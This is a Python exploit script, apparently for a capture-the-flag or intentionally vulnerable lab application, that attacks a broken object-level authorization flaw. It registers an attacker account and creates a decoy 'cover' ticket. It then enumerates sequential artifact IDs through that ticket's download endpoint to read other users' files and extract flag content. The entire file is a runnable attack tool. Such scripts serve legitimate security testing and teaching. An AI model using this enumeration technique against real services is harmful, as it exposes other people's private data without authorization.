import argparse
import sys

import requests

from _common import auth_headers, create_ticket, info, ok, register_or_login


TARGET_MARKER = b"FLAG_VULN3_artifact_content_"


def main():
    ap = argparse.ArgumentParser(description="Vuln 3: BOLA on artifact download")
    ap.add_argument("--base", default="http://localhost:8080")
    ap.add_argument("--start", type=int, default=1, help="first public_ref to try")
    ap.add_argument("--count", type=int, default=200, help="how many refs to walk")
    args = ap.parse_args()

    username, token = register_or_login(args.base, prefix="red_v3")
    ok(f"registered attacker {username}")

    cover = create_ticket(args.base, token, title="cover", description="cover ticket")
    cover_id = cover["id"]
    ok(f"created cover ticket {cover_id}")

    info(f"walking public_ref {args.start}..{args.start + args.count - 1}")
    found = []
    for ref in range(args.start, args.start + args.count):
        url = f"{args.base}/api/tickets/{cover_id}/artifacts/{ref}/download"
        r = requests.get(url, headers=auth_headers(token), timeout=5)
        if r.status_code != 200:
            continue
        body = r.content
        if TARGET_MARKER in body:
            found.append((ref, body))
            ok(f"hit public_ref={ref} size={len(body)} content={body!r}")
        else:
            info(f"public_ref={ref} readable but no flag (size={len(body)})")

    if not found:
        info("no flag found")
        sys.exit(2)

    for ref, body in found:
        ok(f"flag from artifact #{ref}: {body.decode(errors='replace').strip()}")


if __name__ == "__main__":
    main()
